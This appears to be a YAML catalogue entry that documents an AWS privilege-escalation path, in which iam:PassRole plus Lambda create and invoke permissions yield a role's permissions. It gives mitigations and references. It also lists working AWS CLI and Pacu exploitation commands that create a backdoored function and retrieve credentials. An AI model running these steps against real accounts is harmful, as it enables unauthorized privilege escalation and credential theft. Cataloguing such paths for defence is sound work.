id: lambda-001
name: iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
category: service-passrole
services:
- iam
- lambda
description: A principal with `iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction` can create a new Lambda function and attach an existing IAM Role to it. When the function is invoked, the code executes with the permissions of the attached role. The level of access gained depends on the permissions of the available roles.
prerequisites:
  admin:
  - A role must exist that trusts lambda.amazonaws.com to assume it
  - The role must have administrative permissions (e.g., AdministratorAccess)
  lateral:
  - A role must exist that trusts lambda.amazonaws.com to assume it
exploitationSteps:
  awscli:
  - step: 1
    command: aws lambda create-function --function-name privesc-function --runtime python3.9 --role "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE"
      --handler index.handler --zip-file fileb://exploit.zip
    description: Create a Lambda function with the privileged role and malicious code
  - step: 2
    command: aws lambda invoke --function-name privesc-function output.txt
    description: Invoke the function to execute code with elevated privileges
  - step: 3
    command: cat output.txt
    description: View the output containing credentials or results of privileged API calls
  pacu:
  - step: 1
    command: run lambda__backdoor_new_roles --role PRIVILEGED_ROLE
    description: Use Pacu to create a backdoored Lambda function with the target role
  - step: 2
    command: run lambda__invoke --function-name privesc-function
    description: Invoke the function to retrieve credentials
recommendation: |
  Restrict the `iam:PassRole` permission using the principle of least privilege.

  Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "`iam:PassRole`",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificLambdaRole",
    "Condition": {
      "StringEquals": {
        "`iam:PassedToService`": "lambda.amazonaws.com"
      }
    }
  }
  ```

  Additionally, restrict Lambda function creation and invocation:
  - Limit `lambda:CreateFunction` to specific function name patterns
  - Require resource-based policies on Lambda functions
  - Monitor CloudTrail for unusual Lambda function creation followed by immediate invocation
discoveredBy:
  name: Spencer Gietzen
  organization: Rhino Security Labs
  date: '2019'
references:
- title: AWS Privilege Escalation Methods and Mitigation
  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- title: IAM Vulnerable - PassExistingRoleToNewLambdaThenInvoke
  url: https://github.com/BishopFox/iam-vulnerable/blob/main/modules/free-resources/privesc-paths/privesc15-PassExistingRoleToNewLambdaThenInvoke.tf
relatedPaths:
- ec2-001
- cloudformation-001
toolSupport:
  pmapper: true
  iamVulnerable: true
permissions:
  required:
  - permission: iam:PassRole
    resourceConstraints: Target role ARN must be in the Resource section
  - permission: lambda:CreateFunction
    resourceConstraints: Must have permission to create Lambda functions
  - permission: lambda:InvokeFunction
    resourceConstraints: Must have permission to invoke Lambda functions
  additional:
  - permission: iam:ListRoles
    resourceConstraints: Helpful for discovering available roles to pass
  - permission: iam:GetRole
    resourceConstraints: Useful for viewing role trust policies and attached permissions
